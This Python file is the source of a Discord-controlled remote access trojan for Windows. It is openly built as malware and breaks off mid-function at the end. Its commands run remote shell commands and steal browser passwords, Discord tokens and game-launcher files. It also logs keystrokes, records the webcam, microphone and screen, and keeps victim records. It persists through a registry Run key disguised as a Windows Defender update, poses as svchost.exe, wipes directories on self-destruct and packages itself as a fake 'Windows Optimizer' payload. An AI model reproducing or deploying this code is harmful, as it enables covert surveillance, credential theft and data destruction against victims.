# FUTURE --------------------------------------------------------------------------------------------------
# TODO : IMPLEMENT REAL LOCATION GEO(API IS PAIN IN THE ASS)
# TODO : ADD BETTER STORAGE AND DATABASES
# TODO : FASTER .EXE FILE MAKE (COMPRESS IT?)
# TODO : ADD A GUI FOR LATER THAT CAN ALSO BE CONNECTED TO DISCORD TOO
# TODO : ADD LIVE VOICE HEARING THRU MIC WHEN USER JOINS VC
# TODO : ADD RANSOMWARE AND CRYPTO MINING
# TODO : ADD A ADMIN PANEL GUI FOR ME TO TRACK ANALYTICS

import discord
from discord.ext import commands
import platform
import psutil
import subprocess
import os
import getpass
import ctypes
import pyautogui
import cv2
import numpy as np
from PIL import ImageGrab
import datetime
import asyncio
import pyperclip
import tempfile
import pynput.keyboard
from pynput import keyboard
import sys
import shutil
import winreg
import zipfile
import re
import sqlite3
import json
import base64
from Crypto.Cipher import AES
import requests  
import win32crypt
import pyaudio
import wave
import glob
import webbrowser
import time



TOKEN = "YOUR-BOT-TOKEN"

intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
intents.messages = True

bot = commands.Bot(command_prefix="!", intents=intents)

# --- Database Setup ---
DB_PATH = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'sysdata.db')

def init_database():
    """Initialize SQLite database for storing stolen data and analytics"""
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()

    # Table for stolen credentials
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS credentials (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TEXT,
            browser TEXT,
            url TEXT,
            username TEXT,
            password TEXT,
            victim_id TEXT
        )
    ''')

    # Table for victim analytics
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS victims (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            victim_id TEXT UNIQUE,
            first_seen TEXT,
            last_seen TEXT,
            hostname TEXT,
            username TEXT,
            os_version TEXT,
            ip_address TEXT,
            country TEXT,
            city TEXT,
            total_commands INTEGER DEFAULT 0
        )
    ''')

    # Table for command logs
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS command_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TEXT,
            victim_id TEXT,
            command TEXT,
            success INTEGER
        )
    ''')

    # Table for keylog data
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS keylogs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TEXT,
            victim_id TEXT,
            keystrokes TEXT
        )
    ''')

    # Table for Discord tokens
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS discord_tokens (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TEXT,
            victim_id TEXT,
            token TEXT UNIQUE
        )
    ''')

    conn.commit()
    conn.close()

def get_victim_id():
    """Generate unique victim ID based on hardware"""
    try:
        hostname = platform.node()
        username = getpass.getuser()
        return f"{hostname}_{username}_{platform.machine()}"
    except:
        return "UNKNOWN"

def log_command(command, success=True):
    """Log executed command to database"""
    try:
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO command_logs (timestamp, victim_id, command, success)
            VALUES (?, ?, ?, ?)
        ''', (datetime.datetime.now().isoformat(), get_victim_id(), command, 1 if success else 0))
        conn.commit()
        conn.close()
    except:
        pass

def update_victim_info():
    """Update or create victim record"""
    try:
        victim_id = get_victim_id()
        uname = platform.uname()
        ip = get_public_ip()

        # Get location data
        location_data = {}
        if ip:
            try:
                response = requests.get(f"http://ip-api.com/json/{ip}", timeout=5).json()
                if response.get('status') == 'success':
                    location_data = response
            except:
                pass

        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()

        # Check if victim exists
        cursor.execute('SELECT id, total_commands FROM victims WHERE victim_id = ?', (victim_id,))
        result = cursor.fetchone()

        if result:
            # Update existing victim
            cursor.execute('''
                UPDATE victims
                SET last_seen = ?, ip_address = ?, country = ?, city = ?, total_commands = ?
                WHERE victim_id = ?
            ''', (
                datetime.datetime.now().isoformat(),
                ip or 'Unknown',
                location_data.get('country', 'Unknown'),
                location_data.get('city', 'Unknown'),
                result[1] + 1,
                victim_id
            ))
        else:
            # Create new victim record
            cursor.execute('''
                INSERT INTO victims (victim_id, first_seen, last_seen, hostname, username, os_version, ip_address, country, city, total_commands)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (
                victim_id,
                datetime.datetime.now().isoformat(),
                datetime.datetime.now().isoformat(),
                uname.node,
                getpass.getuser(),
                f"{uname.system} {uname.release}",
                ip or 'Unknown',
                location_data.get('country', 'Unknown'),
                location_data.get('city', 'Unknown'),
                1
            ))

        conn.commit()
        conn.close()
    except:
        pass

# Initialize database on startup
try:
    init_database()
    update_victim_info()
except:
    pass

# --- Screen recording state ---
screen_recording = {
    "is_recording": False,
    "channel": None,
    "task": None
}

# --- Keylogger state ---
keylogger_state = {
    "is_active": False,
    "channel": None,
    "listener": None,
    "buffer": [],
    "task": None
}

@bot.event
async def on_ready():
    print(f"Bot connected as {bot.user}")
    update_victim_info()

@bot.command(name="analytics")
async def show_analytics(ctx):
    """📊 Show victim analytics from database"""
    try:
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()

        # Get victim info
        cursor.execute('SELECT * FROM victims WHERE victim_id = ?', (get_victim_id(),))
        victim = cursor.fetchone()

        if not victim:
            await ctx.send("❌ No analytics data found")
            return

        # Get command count
        cursor.execute('SELECT COUNT(*) FROM command_logs WHERE victim_id = ?', (get_victim_id(),))
        cmd_count = cursor.fetchone()[0]

        # Get credential count
        cursor.execute('SELECT COUNT(*) FROM credentials WHERE victim_id = ?', (get_victim_id(),))
        cred_count = cursor.fetchone()[0]

        # Get token count
        cursor.execute('SELECT COUNT(*) FROM discord_tokens WHERE victim_id = ?', (get_victim_id(),))
        token_count = cursor.fetchone()[0]

        embed = discord.Embed(
            title="📊 Victim Analytics",
            color=0xff6b6b,
            description=f"**Victim ID:** `{victim[1]}`"
        )

        embed.add_field(name="🖥️ System Info", value=f"**Hostname:** {victim[4]}\n**Username:** {victim[5]}\n**OS:** {victim[6]}", inline=False)
        embed.add_field(name="🌍 Location", value=f"**IP:** {victim[7]}\n**Country:** {victim[8]}\n**City:** {victim[9]}", inline=False)
        embed.add_field(name="📅 Activity", value=f"**First Seen:** {victim[2]}\n**Last Seen:** {victim[3]}\n**Total Commands:** {victim[10]}", inline=False)
        embed.add_field(name="💰 Stolen Data", value=f"**Credentials:** {cred_count}\n**Discord Tokens:** {token_count}", inline=False)

        conn.close()
        await ctx.send(embed=embed)

    except Exception as e:
        await ctx.send(f"❌ Analytics error: {str(e)}")

@bot.command(name="dumpdb")
async def dump_database(ctx):
    """💾 Download the entire database file"""
    try:
        if os.path.exists(DB_PATH):
            await ctx.send("📦 **Sending database file...**", file=discord.File(DB_PATH, "victim_data.db"))
            log_command("dumpdb", True)
        else:
            await ctx.send("❌ Database file not found")
    except Exception as e:
        await ctx.send(f"❌ Database dump failed: {str(e)}")

@bot.command(name="viewcreds")
async def view_stored_creds(ctx, limit: int = 20):
    """🔑 View stored credentials from database"""
    try:
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        cursor.execute('''
            SELECT timestamp, browser, url, username, password
            FROM credentials
            WHERE victim_id = ?
            ORDER BY timestamp DESC
            LIMIT ?
        ''', (get_victim_id(), limit))

        results = cursor.fetchall()
        conn.close()

        if not results:
            await ctx.send("❌ No stored credentials found")
            return

        output = f"**🔑 Stored Credentials (Last {len(results)}):**\n\n"
        for row in results:
            output += f"**[{row[0]}]** {row[1]}\n"
            output += f"URL: {row[2]}\n"
            output += f"User: {row[3]}\n"
            output += f"Pass: {row[4]}\n\n"

        # Split if too long
        if len(output) > 1900:
            chunks = [output[i:i+1900] for i in range(0, len(output), 1900)]
            for chunk in chunks:
                await ctx.send(chunk)
        else:
            await ctx.send(output)

    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

# ---------------- Core Commands ----------------------

@bot.command(name="systeminfo")
async def system_info(ctx):
    uname = platform.uname()
    cpu = psutil.cpu_percent(interval=1)
    memory = psutil.virtual_memory()
    response = (
        f"📊 **System Information:**\n"
        f"• System: {uname.system}\n"
        f"• Node Name: {uname.node}\n"
        f"• Release: {uname.release}\n"
        f"• Version: {uname.version}\n"
        f"• Machine: {uname.machine}\n"
        f"• Processor: {uname.processor}\n"
        f"• CPU Usage: {cpu}%\n"
        f"• RAM Usage: {memory.percent}%"
    )
    await ctx.send(response)

@bot.command(name="screenshot")
async def screenshot(ctx):
    try:
        screenshot = pyautogui.screenshot()
        screenshot.save("screenshot.png")
        await ctx.send(file=discord.File("screenshot.png"))
        os.remove("screenshot.png")
    except Exception as e:
        await ctx.send(f"Failed to take screenshot: {e}")

@bot.command(name="shutdown")
async def shutdown(ctx):
    await ctx.send("Shutting down the system in 5 seconds...")
    subprocess.call("shutdown /s /t 5", shell=True)

# ---- [STARTUP PERSISTENCE] ---- #
def add_to_startup():
    """Makes the bot copy itself to AppData and add to Windows startup."""
    try:
        # Get bot's current path
        bot_path = os.path.abspath(sys.argv[0])
        bot_name = "admin_bot.exe"  # Your desired filename
        
        # Copy to hidden AppData folder
        appdata = os.getenv("APPDATA")
        hidden_path = os.path.join(appdata, "Microsoft", "Windows", "admin_bot.exe")
        shutil.copy2(bot_path, hidden_path)
        
        # Add to registry (Windows startup)
        key = winreg.HKEY_CURRENT_USER
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(key, key_path, 0, winreg.KEY_WRITE) as regkey:
            winreg.SetValueEx(regkey, "Windows Defender Update", 0, winreg.REG_SZ, hidden_path)
        
        return True
    except Exception as e:
        print(f"Persistence error: {e}")
        return False
    
@bot.command(name="stopstartup")
async def stop_startup(ctx):
    """💣 Completely removes bot from startup and deletes all traces."""
    try:
        # Remove registry entry
        key = winreg.HKEY_CURRENT_USER
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(key, key_path, 0, winreg.KEY_WRITE) as regkey:
            winreg.DeleteValue(regkey, "Windows Defender Update")
        
        # Delete hidden copy
        hidden_path = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "admin_bot.exe")
        if os.path.exists(hidden_path):
            os.remove(hidden_path)
        
        # Kill the bot process
        await ctx.send("**💀 SELF-DESTRUCT INITIATED**\nBot will exit in 5 seconds...")
        await asyncio.sleep(5)
        os._exit(0)
        
    except Exception as e:
        await ctx.send(f"Failed to self-destruct: {e}")

# ---- [ANTI-DELETION PROTECTION] ---- #
def protect_process():
    """Makes the bot harder to kill (fake 'System' process)."""
    try:
        # Rename process in Task Manager
        ctypes.windll.kernel32.SetConsoleTitleW("svchost.exe")
        
        # Hide file attributes (Windows)
        bot_path = os.path.abspath(sys.argv[0])
        ctypes.windll.kernel32.SetFileAttributesW(bot_path, 2)  # 2 = HIDDEN
    except:
        pass

# ---- [SELF-REPAIR IF DELETED] ---- #
def self_heal():
    """If the original bot is deleted, the startup copy recreates it."""
    bot_path = os.path.abspath(sys.argv[0])
    if not os.path.exists(bot_path):
        shutil.copy2(os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "admin_bot.exe"), bot_path)

# ---- [BOT COMMAND] ---- #
@bot.command(name="persist")
async def persist(ctx):
    """💀 Makes the bot immortal (startup + hidden + protected)."""
    if add_to_startup():
        protect_process()
        await ctx.send("**💀 Bot is now PERMANENT.**\n"
                      "- Hidden in `AppData`\n"
                      "- Launches on startup\n"
                      "- Disguised as `svchost.exe`")
    else:
        await ctx.send("Failed. (Maybe not Windows?)")

# ---- [RUN AT BOT LAUNCH] ---- #
protect_process()  # Hide immediately
self_heal()       # Check if deleted

@bot.command(name="selfdestruct")  
async def self_destruct(ctx):  
    """Deletes the bot and all traces (USE CAREFULLY)"""  
    await ctx.send("💣 **SELF-DESTRUCT INITIATED** 💣")  
    try:  
        os.remove(__file__)  # Delete the script  
        subprocess.call("rm -rf *", shell=True)  # Wipe directory (Linux)  
        subprocess.call("del /f /s /q *", shell=True)  # Wipe directory (Windows)  
    except:  
        pass  
    await bot.close()  

@bot.command(name="restart")
async def restart(ctx):
    await ctx.send("Restarting the system in 5 seconds...")
    subprocess.call("shutdown /r /t 5", shell=True)

@bot.command(name="exec")
async def exec_command(ctx, *, command: str):
    try:
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True, timeout=10)
        if len(output) > 1900:
            output = output[:1900] + "\n[Output truncated]"
        await ctx.send(f"```{output}```")
    except subprocess.CalledProcessError as e:
        await ctx.send(f"Command failed:\n```{e.output}```")
    except Exception as e:
        await ctx.send(f"Error: {e}")

def steal_tokens():
    """Searches for Discord tokens in local storage (Windows only)."""
    paths = [
        os.getenv('APPDATA') + r'\Discord\Local Storage\leveldb',
        os.getenv('APPDATA') + r'\discordptb\Local Storage\leveldb',
        os.getenv('APPDATA') + r'\discordcanary\Local Storage\leveldb'
    ]
    
    tokens = set()
    for path in paths:
        if not os.path.exists(path):
            continue
            
        for file in os.listdir(path):
            if not file.endswith('.log') and not file.endswith('.ldb'):
                continue
                
            try:
                with open(os.path.join(path, file), 'r', encoding='utf-8', errors='ignore') as f:
                    for line in f:
                        for match in re.finditer(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', line):
                            tokens.add(match.group())
            except:
                pass
                
    return list(tokens)

@bot.command(name="dumpdiscord")
async def dump_discord_info(ctx):
    """💣 Steals complete Discord data and sends directly to chat"""
    try:
        await ctx.send("**🕵️‍♂️ RAIDING DISCORD DATA...**")
        
        stolen_data = []
        discord_paths = [
            os.getenv('APPDATA') + r'\Discord',
            os.getenv('APPDATA') + r'\discordptb', 
            os.getenv('APPDATA') + r'\discordcanary',
            os.getenv('LOCALAPPDATA') + r'\Google\Chrome\User Data\Default\Local Storage\leveldb',  # Chrome Discord
            os.getenv('LOCALAPPDATA') + r'\Microsoft\Edge\User Data\Default\Local Storage\leveldb'   # Edge Discord
        ]
        
        # --- TOKEN EXTRACTION ---
        tokens_found = set()
        for base_path in discord_paths:
            if not os.path.exists(base_path):
                continue
                
            # Search for tokens in all files
            for root, dirs, files in os.walk(base_path):
                for file in files:
                    if file.endswith('.log') or file.endswith('.ldb') or file.endswith('.sqlite') or file.endswith('.db'):
                        try:
                            file_path = os.path.join(root, file)
                            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                                content = f.read()
                                # Find Discord tokens
                                found_tokens = re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', content)
                                if found_tokens:
                                    tokens_found.update(found_tokens)
                        except:
                            continue
        
        # --- ACCOUNT INFO EXTRACTION ---
        account_info = []
        for base_path in discord_paths[:3]:  # Only actual Discord installs
            if not os.path.exists(base_path):
                continue
                
            # Look for settings files that contain account info
            settings_files = [
                os.path.join(base_path, 'Local Storage', 'leveldb'),
                os.path.join(base_path, 'Local State'),
                os.path.join(base_path, 'Settings')
            ]
            
            for settings_path in settings_files:
                if os.path.exists(settings_path):
                    if os.path.isdir(settings_path):
                        for file in os.listdir(settings_path):
                            if file.endswith('.log') or file.endswith('.ldb'):
                                try:
                                    with open(os.path.join(settings_path, file), 'r', encoding='utf-8', errors='ignore') as f:
                                        content = f.read()
                                        # Find email addresses
                                        emails = re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', content)
                                        # Find usernames
                                        usernames = re.findall(r'"username":"([^"]+)"', content)
                                        # Find user IDs
                                        user_ids = re.findall(r'"id":"(\d+)"', content)
                                        
                                        if emails or usernames or user_ids:
                                            account_info.append(f"**From {file}:**")
                                            if emails:
                                                account_info.append(f"Emails: {', '.join(emails)}")
                                            if usernames:
                                                account_info.append(f"Usernames: {', '.join(usernames)}")
                                            if user_ids:
                                                account_info.append(f"User IDs: {', '.join(user_ids)}")
                                            account_info.append("")
                                except:
                                    continue
        
        # --- BUILD THE MESSAGE ---
        message_parts = []
        
        # Add tokens section
        if tokens_found:
            message_parts.append("**🔑 DISCORD TOKENS FOUND:**")
            for i, token in enumerate(tokens_found, 1):
                message_parts.append(f"{i}. `{token}`")
            message_parts.append("")
        else:
            message_parts.append("**❌ NO TOKENS FOUND**")
            message_parts.append("")
        
        # Add account info section
        if account_info:
            message_parts.append("**📧 ACCOUNT INFORMATION:**")
            message_parts.extend(account_info)
        else:
            message_parts.append("**❌ NO ACCOUNT INFO FOUND**")
            message_parts.append("")
        
        # --- SEND THE DATA ---
        full_message = "\n".join(message_parts)
        
        # Split into multiple messages if too long
        if len(full_message) > 1900:
            chunks = [full_message[i:i+1900] for i in range(0, len(full_message), 1900)]
            for i, chunk in enumerate(chunks, 1):
                await ctx.send(f"**Part {i}:**\n{chunk}")
        else:
            await ctx.send(full_message)
            
        # --- SEND ADDITIONAL FILES IF POSSIBLE ---
        # Try to send actual Discord files
        try:
            for base_path in discord_paths[:3]:
                if os.path.exists(base_path):
                    # Look for interesting files
                    interesting_files = [
                        os.path.join(base_path, 'Local Storage', 'leveldb', '*.ldb'),
                        os.path.join(base_path, 'Local Storage', 'leveldb', '*.log'),
                        os.path.join(base_path, 'Local State'),
                        os.path.join(base_path, 'Cookies'),
                        os.path.join(base_path, 'Preferences')
                    ]
                    
                    for pattern in interesting_files:
                        for file_path in glob.glob(pattern):
                            try:
                                if os.path.getsize(file_path) < 8000000:  # 8MB limit
                                    await ctx.send(f"**File:** `{os.path.basename(file_path)}`", 
                                                  file=discord.File(file_path))
                            except:
                                continue
        except:
            pass
            
        await ctx.send("**✅ DISCORD DATA DUMP COMPLETE**")
        
    except Exception as e:
        await ctx.send(f"**❌ DUMP FAILED:** {str(e)}")

@bot.command(name="micrecord")
async def record_microphone(ctx, duration: int = 30):
    """🎤 Records microphone audio for specified duration."""
    try:


 # Audio configuration
        CHUNK = 1024
        FORMAT = pyaudio.paInt16
        CHANNELS = 1
        RATE = 44100
        RECORD_SECONDS = duration

        p = pyaudio.PyAudio()

        stream = p.open(format=FORMAT,
                        channels=CHANNELS,
                        rate=RATE,
                        input=True,
                        frames_per_buffer=CHUNK)

        await ctx.send(f"Recording microphone for {duration} seconds...")

        frames = []
        for i in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
            data = stream.read(CHUNK)
            frames.append(data)

        stream.stop_stream()
        stream.close()
        p.terminate()

        # Save recording
        wf = wave.open("mic_recording.wav", 'wb')
        wf.setnchannels(CHANNELS)
        wf.setsampwidth(p.get_sample_size(FORMAT))
        wf.setframerate(RATE)
        wf.writeframes(b''.join(frames))
        wf.close()

        await ctx.send(file=discord.File("mic_recording.wav"))
        os.remove("mic_recording.wav")
        log_command("micrecord", True)

    except Exception as e:
        await ctx.send(f"Microphone recording failed: {e}\nInstall pyaudio first: `pip install pyaudio`")
        log_command("micrecord", False)

# --- Live Voice Monitoring State ---
live_audio_state = {
    "is_streaming": False,
    "channel": None,
    "task": None,
    "voice_client": None
}

class MicrophoneAudioSource(discord.AudioSource):
    """Custom audio source that streams from microphone"""
    def __init__(self):
        self.p = pyaudio.PyAudio()
        self.stream = self.p.open(
            format=pyaudio.paInt16,
            channels=2,
            rate=48000,  # Discord uses 48kHz
            input=True,
            frames_per_buffer=960  # 20ms at 48kHz
        )

    def read(self):
        """Read audio data from microphone"""
        try:
            data = self.stream.read(960, exception_on_overflow=False)
            return data
        except:
            return b'\x00' * 1920  # Return silence on error

    def cleanup(self):
        """Clean up audio resources"""
        try:
            self.stream.stop_stream()
            self.stream.close()
            self.p.terminate()
        except:
            pass

@bot.command(name="startlive")
async def start_live_audio(ctx):
    """🎙️ Start live microphone streaming to Discord voice channel"""
    try:
        if live_audio_state["is_streaming"]:
            await ctx.send("⚠️ Live audio is already streaming!")
            return

        # Check if user is in a voice channel
        if not ctx.author.voice:
            await ctx.send("❌ You must be in a voice channel first!")
            return

        channel = ctx.author.voice.channel

        # Connect to voice channel
        voice_client = await channel.connect()

        # Create audio source
        audio_source = MicrophoneAudioSource()

        # Start playing (streaming)
        voice_client.play(audio_source)

        live_audio_state.update({
            "is_streaming": True,
            "channel": ctx.channel,
            "voice_client": voice_client
        })

        await ctx.send(f"🎙️ **Live microphone streaming started!**\n"
                      f"📡 Streaming to: {channel.name}\n"
                      f"⚠️ Use `!stoplive` to stop streaming")
        log_command("startlive", True)

    except Exception as e:
        await ctx.send(f"❌ Failed to start live audio: {str(e)}")
        log_command("startlive", False)

@bot.command(name="stoplive")
async def stop_live_audio(ctx):
    """🛑 Stop live microphone streaming"""
    try:
        if not live_audio_state["is_streaming"]:
            await ctx.send("⚠️ No live audio is currently streaming!")
            return

        # Stop and disconnect
        if live_audio_state["voice_client"]:
            live_audio_state["voice_client"].stop()
            await live_audio_state["voice_client"].disconnect()

        live_audio_state.update({
            "is_streaming": False,
            "channel": None,
            "voice_client": None
        })

        await ctx.send("🛑 **Live microphone streaming stopped**")
        log_command("stoplive", True)

    except Exception as e:
        await ctx.send(f"❌ Failed to stop live audio: {str(e)}")
        log_command("stoplive", False)

@bot.command(name="livestatus")
async def live_audio_status(ctx):
    """📊 Check live audio streaming status"""
    if live_audio_state["is_streaming"]:
        await ctx.send(f"✅ **Live audio is currently streaming**\n"
                      f"Voice Channel: {live_audio_state['voice_client'].channel.name if live_audio_state['voice_client'] else 'Unknown'}")
    else:
        await ctx.send("❌ **No live audio streaming active**")

def create_executable():
    """
    Uses PyInstaller to build the current script into a single executable.
    Optimized with UPX compression and various flags to reduce size.
    """
    script_path = os.path.abspath(sys.argv[0])
    exe_name = "Windows Optimizer"

    command = [
        'pyinstaller',
        '--onefile',                    # Single executable
        '--noconsole',                  # No console window
        '--name', exe_name,
        '--icon', 'NONE',
        '--clean',                      # Clean cache
        '--strip',                      # Strip symbols (reduces size)
        '--noupx',                      # We'll compress manually if UPX available
        '--optimize', '2',              # Python optimization level
        '--exclude-module', 'tkinter',  # Exclude unused modules
        '--exclude-module', 'matplotlib',
        '--exclude-module', 'numpy.testing',
        '--exclude-module', 'PIL.ImageQt',
        '--log-level', 'ERROR',
        script_path
    ]

    try:
        # Build with PyInstaller
        process = subprocess.run(command, check=True, capture_output=True, text=True)
        final_path = os.path.join('dist', f'{exe_name}.exe')

        # Try to compress with UPX if available
        try:
            upx_result = subprocess.run(['upx', '--best', '--lzma', final_path],
                                       capture_output=True, text=True, timeout=300)
            if upx_result.returncode == 0:
                compression_info = f"\n✅ UPX Compression successful!"
            else:
                compression_info = f"\n⚠️ UPX compression skipped (not available or failed)"
        except (FileNotFoundError, subprocess.TimeoutExpired):
            compression_info = f"\n⚠️ UPX not found - install for smaller file size"

        # Get file size
        if os.path.exists(final_path):
            size_mb = os.path.getsize(final_path) / (1024 * 1024)
            size_info = f"\n📦 Final size: {size_mb:.2f} MB"
        else:
            size_info = ""

        return final_path, None, compression_info + size_info

    except subprocess.CalledProcessError as e:
        error_message = f"Build Failed!\nExit Code: {e.returncode}\n--- STDOUT ---\n{e.stdout}\n--- STDERR ---\n{e.stderr}"
        return None, error_message, ""
    except FileNotFoundError:
        return None, "Build Failed: `pyinstaller` command not found. Make sure it's installed (`pip install pyinstaller`) and in your system's PATH.", ""

@bot.command(name="build")
@commands.is_owner()
async def build_command(ctx):
    """🛠️ Compiles the bot into a standalone .exe and sends it."""
    try:
        await ctx.send("`Building executable... This may take a few minutes. Please wait.`")

        final_path, error, info = await bot.loop.run_in_executor(None, create_executable)

        if error:
            if len(error) > 1900:
                await ctx.send(f"**BUILD FAILED:**\n```...{error[-1900:]}```")
            else:
                await ctx.send(f"**BUILD FAILED:**\n```{error}```")
            return

        if final_path and os.path.exists(final_path):
            await ctx.send(
                content=f"**✅ Build Successful!**{info}\n\nHere is your payload. Run this on any Windows machine.",
                file=discord.File(final_path)
            )
        else:
            await ctx.send("**❌ Build Failed!** The executable was not found after the build process.")

    except Exception as e:
        await ctx.send(f"**An unexpected error occurred during the build process:**\n```{str(e)}```")
    finally:
        if os.path.exists('build'):
            shutil.rmtree('build')
        if os.path.exists('dist'):
            shutil.rmtree('dist')
        spec_files = glob.glob('*.spec')
        for f in spec_files:
            os.remove(f)


@bot.command(name="listprocesses")
async def list_processes(ctx):
    try:
        processes = psutil.process_iter(['pid', 'name'])
        msg = "**Running processes:**\n"
        count = 0
        for proc in processes:
            msg += f"• {proc.info['name']} (PID: {proc.info['pid']})\n"
            count += 1
            if count >= 25:
                msg += "...and more\n"
                break
        await ctx.send(msg)
    except Exception as e:
        await ctx.send(f"Failed to list processes: {e}")

@bot.command(name="kill")
async def kill_process(ctx, pid: int):
    try:
        p = psutil.Process(pid)
        p.terminate()
        await ctx.send(f"Process PID {pid} terminated.")
    except Exception as e:
        await ctx.send(f"Failed to kill PID {pid}: {e}")

@bot.command(name="download")
async def download(ctx, *, filepath: str):
    if os.path.isfile(filepath):
        try:
            await ctx.send(file=discord.File(filepath))
        except Exception as e:
            await ctx.send(f"Failed to send file: {e}")
    else:
        await ctx.send("File not found.")

@bot.command(name="dumpcreds")
async def dump_credentials(ctx):
    """💣 Dumps all saved browser passwords (Chrome, Edge, Brave, etc.)."""
    try:
        await ctx.send("**🔑 Searching for saved browser credentials... This may take a moment.**")
        
        # Run the blocking function in a separate thread
        credentials_data = await bot.loop.run_in_executor(None, steal_browser_creds)
        
        # Create a temporary file to send the credentials
        with tempfile.NamedTemporaryFile(mode='w+', delete=False, suffix='.txt', encoding='utf-8') as tmp_file:
            tmp_file.write(credentials_data)
            tmp_file_path = tmp_file.name
        
        await ctx.send("**✅ Credential dump complete.** Results are in the attached file.", file=discord.File(tmp_file_path, "credentials.txt"))
        
        os.remove(tmp_file_path)

    except Exception as e:
        await ctx.send(f"**❌ An error occurred during credential dumping:** {str(e)}")

@bot.command(name="dumpgames")
async def dump_game_data(ctx):
    """Steals data from Minecraft and Epic Games launchers."""
    await ctx.send("🎮 **Raiding game launcher data...**")
    paths = {
        'Minecraft Logs': '%APPDATA%\\.minecraft\\logs',
        'Minecraft Launcher Accounts': '%APPDATA%\\.minecraft\\launcher_accounts.json',
        'Epic Games Data': '%LOCALAPPDATA%\\EpicGamesLauncher\\Saved\\Config\\Windows'
    }

    zip_file = await bot.loop.run_in_executor(None, find_and_zip, paths, "Game_Data.zip")

    if zip_file:
        await ctx.send("✅ **Game data found and zipped.**", file=discord.File(zip_file))
        os.remove(zip_file)
    else:
        await ctx.send("❌ No game data found.")

def find_and_zip(paths_to_check, zip_name):
    """Finds files/dirs, zips them, and returns the zip path."""
    temp_dir = tempfile.mkdtemp()
    zip_path = os.path.join(tempfile.gettempdir(), zip_name)
    has_data = False

    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
        for name, path in paths_to_check.items():
            path = os.path.expandvars(path) # Expands variables like %APPDATA%
            if os.path.exists(path):
                has_data = True
                if os.path.isdir(path):
                    for root, _, files in os.walk(path):
                        for file in files:
                            file_path = os.path.join(root, file)
                            arcname = os.path.join(name, os.path.relpath(file_path, path))
                            zf.write(file_path, arcname)
                else: # It's a file
                    zf.write(path, os.path.join(name, os.path.basename(path)))
    
    shutil.rmtree(temp_dir)
    return zip_path if has_data else None

@bot.command(name="connections")
async def list_connections(ctx):
    """Show active network connections"""
    result = subprocess.run(["netstat", "-ano"], capture_output=True, text=True)
    await ctx.send(f"```{result.stdout[:1900]}```")

@bot.command(name="message")
async def message_box(ctx, *, text: str):
    try:
        ctypes.windll.user32.MessageBoxW(0, text, "Message from Discord Bot", 1)
        await ctx.send("Message box displayed.")
    except Exception as e:
        await ctx.send(f"Failed to display message box: {e}")

@bot.command(name="userinfo")
async def user_info(ctx):
    try:
        user = getpass.getuser()
        home = os.path.expanduser("~")
        env_vars = os.environ
        response = (
            f"👤 **User Info:**\n"
            f"Username: {user}\n"
            f"Home Directory: {home}\n"
            f"Environment Variables:\n"
        )
        for k in ['PATH', 'COMPUTERNAME', 'USERNAME', 'OS']:
            response += f"{k} = {env_vars.get(k, 'N/A')}\n"
        await ctx.send(response)
    except Exception as e:
        await ctx.send(f"Failed to get user info: {e}")

@bot.command(name="webcam")
async def webcam(ctx):
    try:
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            await ctx.send("Cannot open webcam.")
            return
        ret, frame = cap.read()
        cap.release()
        if not ret:
            await ctx.send("Failed to capture image from webcam.")
            return
        filename = "webcam.png"
        cv2.imwrite(filename, frame)
        await ctx.send(file=discord.File(filename))
        os.remove(filename)
    except Exception as e:
        await ctx.send(f"Webcam error: {e}")

@bot.command(name="webcamstream")
async def webcam_live_stream(ctx, duration: int = 60):
    """🎥 Stream live webcam feed"""
    cap = cv2.VideoCapture(0)
    start_time = time.time()
    
    while (time.time() - start_time) < duration:
        ret, frame = cap.read()
        if ret:
            cv2.imwrite('webcam_live.jpg', frame)
            await ctx.send(file=discord.File('webcam_live.jpg'))
            await asyncio.sleep(2)  # Send frame every 2 seconds
    
    cap.release()

# ---------------- Screen Recording -------------------

def record_screen(filename, duration_sec=120, fps=10):
    """Records screen to video file"""
    fourcc = cv2.VideoWriter_fourcc(*"mp4v")
    screen_size = pyautogui.size()
    out = cv2.VideoWriter(filename, fourcc, fps, screen_size)

    start_time = datetime.datetime.now()
    while (datetime.datetime.now() - start_time).seconds < duration_sec and screen_recording["is_recording"]:
        img = pyautogui.screenshot()
        frame = cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR)
        out.write(frame)
        cv2.waitKey(1)  # Needed to prevent freezing

    out.release()

async def send_keylogs_periodically():
    """Sends buffered keys every 5 seconds"""
    while keylogger_state["is_active"]:
        if keylogger_state["buffer"] and keylogger_state["channel"]:
            try:
                message = "".join(keylogger_state["buffer"])
                keylogger_state["buffer"] = []
                await keylogger_state["channel"].send(f"```{message[:1900]}```")
            except Exception as e:
